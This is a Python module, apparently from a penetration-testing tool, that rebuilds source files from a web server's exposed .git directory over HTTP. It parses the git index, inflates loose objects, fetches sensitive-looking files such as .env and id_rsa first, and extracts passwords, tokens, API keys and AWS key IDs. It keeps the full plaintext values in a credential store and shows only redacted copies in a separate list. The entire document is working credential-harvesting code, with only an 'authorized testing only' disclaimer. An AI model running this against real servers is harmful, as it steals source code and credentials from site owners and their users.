"""Reconstruct an exposed .git directory over HTTP (stdlib only).

A web server that serves its `.git/` directory leaks the entire source tree. recce
walks it read-only to recover the tracked files and mine them for secrets/credentials:

  * **.git/index**  - the staging index lists every tracked path + its blob SHA-1
                      (a full map of the source tree, incl. sensitive filenames).
  * **.git/objects/<sha>** - each loose object is zlib-compressed "blob <len>\\0<data>";
                      recce inflates it to recover the file contents.
  * secret mining   - the recovered blobs (and .git/config) are scanned for API keys,
                      passwords, tokens and connection strings -> the credential store.

Packfile objects (delta-compressed) are noted but not delta-resolved here; the index +
loose objects recover the common "exposed .git on a live deploy" case. Read-only:
recce only issues GETs. Authorized testing only.
"""
from __future__ import annotations

import re
import struct
import zlib

# Generic secret patterns for mining recovered blobs (redacted in output).
_SECRET_RE = re.compile(
    r"(?im)\b([A-Za-z0-9_.\-]*(?:password|passwd|pwd|secret|token|api[_-]?key|apikey|"
    r"access[_-]?key|private[_-]?key|client[_-]?secret|auth|bearer)[A-Za-z0-9_.\-]*)"
    r"\s*[:=]\s*[\"']?([^\s\"'#;,]{4,120})")
_URL_CRED_RE = re.compile(r"(?:[a-z][a-z0-9+.\-]*)://([^:/@\s]+):([^@/\s]+)@[^\s/\"']+", re.I)
_AWS_KEY_RE = re.compile(r"\b(AKIA[0-9A-Z]{16})\b")
_SENSITIVE_PATH = re.compile(
    r"\.env|config|secret|credential|\.pem|\.key|id_rsa|password|settings|"
    r"application\.(properties|ya?ml)|wp-config|web\.config|\.npmrc|\.pgpass", re.I)


def _redact(v: str) -> str:
    v = v.strip()
    return f"{v[:2]}…{v[-2:]}" if len(v) > 8 else "****"


def parse_index(data: bytes, cap: int = 500) -> list[tuple[str, str]]:
    """Parse a git index (DIRC v2/v3). Returns [(path, blob_sha_hex), ...]. Tolerant of
    truncation - returns what it could read."""
    out: list[tuple[str, str]] = []
    if len(data) < 12 or data[:4] != b"DIRC":
        return out
    version = struct.unpack(">I", data[4:8])[0]
    count = struct.unpack(">I", data[8:12])[0]
    i = 12
    n = len(data)
    for _ in range(min(count, cap)):
        if i + 62 > n:
            break
        entry_start = i
        sha = data[i + 40:i + 60].hex()
        flags = struct.unpack(">H", data[i + 60:i + 62])[0]
        name_len = flags & 0x0FFF
        extra = 2 if (version >= 3 and (flags & 0x4000)) else 0   # v3 extended flags
        name_start = i + 62 + extra
        if name_len < 0xFFF and name_start + name_len <= n:
            path = data[name_start:name_start + name_len].decode("utf-8", "replace")
            entry_len = (62 + extra) + name_len
            i = entry_start + ((entry_len + 8) & ~7)             # NUL-pad to 8 bytes
        else:                                                     # long name: read to NUL
            nul = data.find(b"\x00", name_start)
            if nul < 0:
                break
            path = data[name_start:nul].decode("utf-8", "replace")
            i = (nul + 8) & ~7
        out.append((path, sha))
    return out


_MAX_INFLATED = 16 * 1024 * 1024  # a hostile 4MB blob of zeros expands to ~4GB; cap it


def inflate_object(raw: bytes) -> tuple[str, bytes] | None:
    """Inflate a loose git object. Returns (type, content) e.g. ('blob', b'...') or None.
    Bounded to _MAX_INFLATED to defuse zlib-bomb blobs from a hostile git server."""
    try:
        d = zlib.decompressobj()
        data = d.decompress(raw, _MAX_INFLATED)
        if d.unconsumed_tail:
            return None                          # blob exceeded the cap
    except zlib.error:
        return None
    nul = data.find(b"\x00")
    if nul < 0:
        return None
    header = data[:nul].split(b" ", 1)
    otype = header[0].decode("ascii", "replace") if header else ""
    return otype, data[nul + 1:]


def _mine(path: str, content: bytes) -> tuple[list[str], list[dict]]:
    """Return (redacted_secret_strings, credential_dicts) from a recovered file."""
    text = content.decode("utf-8", "replace")
    secrets: list[str] = []
    creds: list[dict] = []
    seen: set = set()
    for m in _SECRET_RE.finditer(text):
        key, val = m.group(1), m.group(2)
        pair = f"{key}={_redact(val)}"
        if pair not in secrets:
            secrets.append(pair)
        if val not in ("null", "changeme", "your_password_here", "xxx", "example"):
            k = (key.lower(), val)
            if k not in seen and len(val) >= 6:
                seen.add(k)
                creds.append({"username": key, "secret": val, "path": path})
        if len(secrets) >= 12:
            break
    for u, pw in _URL_CRED_RE.findall(text):
        if (u, pw) not in seen:
            seen.add((u, pw))
            creds.append({"username": u, "secret": pw, "path": path})
    for ak in _AWS_KEY_RE.findall(text):
        creds.append({"username": ak, "secret": "(aws-access-key-id)", "path": path})
    return secrets, creds


def reconstruct(fetch_bytes, max_files: int = 40, max_bytes: int = 4_000_000) -> dict:
    """Walk an exposed .git via `fetch_bytes(relpath) -> bytes | None`. Returns
    {is_git, tracked, recovered, secrets, creds, config, packed, bytes_recovered, error}.
    Read-only (GETs only)."""
    out: dict = {"is_git": False, "tracked": [], "recovered": [], "secrets": [],
                 "creds": [], "config": "", "packed": False, "bytes_recovered": 0,
                 "error": ""}
    head = fetch_bytes(".git/HEAD")
    if not head or b"ref:" not in head and not re.match(rb"[0-9a-f]{40}", head.strip()):
        out["error"] = "no .git/HEAD (directory not exposed)"
        return out
    out["is_git"] = True
    cfg = fetch_bytes(".git/config")
    if cfg:
        out["config"] = cfg.decode("utf-8", "replace")[:4000]
        s, c = _mine(".git/config", cfg)
        out["secrets"].extend(s)
        out["creds"].extend(c)
    idx = fetch_bytes(".git/index")
    tracked = parse_index(idx) if idx else []
    out["tracked"] = [p for p, _ in tracked]
    if fetch_bytes(".git/objects/pack/") is not None or \
            (fetch_bytes(".git/packed-refs") is not None and not tracked):
        out["packed"] = True                    # packfiles present (not delta-resolved here)
    # Prioritize sensitive-looking files, then the rest, up to the caps.
    ordered = sorted(tracked, key=lambda ps: 0 if _SENSITIVE_PATH.search(ps[0]) else 1)
    total = 0
    for path, sha in ordered[:max_files]:
        if total >= max_bytes:
            break
        raw = fetch_bytes(f".git/objects/{sha[:2]}/{sha[2:]}")
        if not raw:
            continue
        obj = inflate_object(raw)
        if not obj or obj[0] != "blob":
            continue
        content = obj[1]
        total += len(content)
        s, c = _mine(path, content)
        for cred in c:
            cred["path"] = path
        out["secrets"].extend(s)
        out["creds"].extend(c)
        out["recovered"].append({"path": path, "size": len(content),
                                 "secrets": len(s)})
    out["bytes_recovered"] = total
    # de-dup creds by (user, secret)
    seen: set = set()
    deduped = []
    for c in out["creds"]:
        k = (c.get("username", "").lower(), c.get("secret", ""))
        if k not in seen:
            seen.add(k)
            deduped.append(c)
    out["creds"] = deduped
    return out
